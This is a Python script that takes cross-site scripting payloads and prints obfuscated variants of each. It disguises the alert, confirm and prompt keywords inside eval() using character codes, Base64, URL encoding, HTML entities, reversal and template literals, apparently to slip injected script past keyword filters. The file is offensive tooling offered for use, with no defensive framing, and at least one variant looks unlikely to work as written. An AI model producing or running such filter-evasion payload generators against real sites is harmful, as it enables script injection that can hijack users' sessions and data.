import sys
import re
import base64
from urllib.parse import quote

def mixed_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            rest = payload[start + len(keyword):]
            
            # Mix of Unicode and String.fromCharCode
            unicode_part = '\\u' + '\\u'.join(f"{ord(c):04x}" for c in keyword[:2])
            charcode_part = ','.join(str(ord(c)) for c in keyword[2:])
            encoded_payloads.append(f"eval('{unicode_part}'+String.fromCharCode({charcode_part})+'{rest}')")
            
            # Mix of Base64 and URL encoding
            b64_keyword = base64.b64encode(keyword.encode()).decode()
            url_rest = quote(rest)
            encoded_payloads.append(f"eval(atob('{b64_keyword}')+decodeURIComponent('{url_rest}'))")
            
            # Mix of HTML entity and Unicode
            html_entity = '&#x' + ';&#x'.join(f"{ord(c):x}" for c in keyword[:2]) + ';'
            unicode_part2 = '\\u' + '\\u'.join(f"{ord(c):04x}" for c in keyword[2:])
            encoded_payloads.append(f"eval('{html_entity}{unicode_part2}{rest}')")
            
            # Mix of String.fromCharCode and template literal
            char_codes = ','.join(str(ord(c)) for c in keyword)
            encoded_payloads.append(f"eval(String.fromCharCode({char_codes})+`{rest}`)")
            
            # Mix of Base64 and character codes
            b64_keyword2 = base64.b64encode(keyword.encode()).decode()
            char_codes_rest = ','.join(str(ord(c)) for c in rest)
            encoded_payloads.append(f"eval(atob('{b64_keyword2}')+String.fromCharCode({char_codes_rest}))")
            
            # Mix of reverse and String.fromCharCode
            reversed_keyword = keyword[::-1]
            char_codes2 = ','.join(str(ord(c)) for c in reversed_keyword[:2])
            plain_part = reversed_keyword[2:]
            encoded_payloads.append(f"eval(String.fromCharCode({char_codes2})+'{plain_part}'.split('').reverse().join('')+'{rest}')")
            
            # Mix of URL encoding and template literal
            url_keyword = quote(keyword)
            encoded_payloads.append(f"eval(decodeURIComponent('{url_keyword}')+`{rest}`)")
            
            # Mix of variable obfuscation and Base64
            b64_keyword3 = base64.b64encode(keyword.encode()).decode()
            encoded_payloads.append(f"var _=atob('{b64_keyword3}');eval(_+String.fromCharCode({','.join(str(ord(c)) for c in rest)}))")
            
            # Triple encoding: Base64 -> URL -> Character codes
            b64_encoded = base64.b64encode(keyword.encode()).decode()
            url_encoded = quote(b64_encoded)
            encoded_payloads.append(f"eval(String.fromCharCode(...atob(decodeURIComponent('{url_encoded}')).split('').map(c=>c.charCodeAt(0)))+'{rest}')")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = mixed_encode(payload)
        for ep in encoded_payloads:
            print(ep)

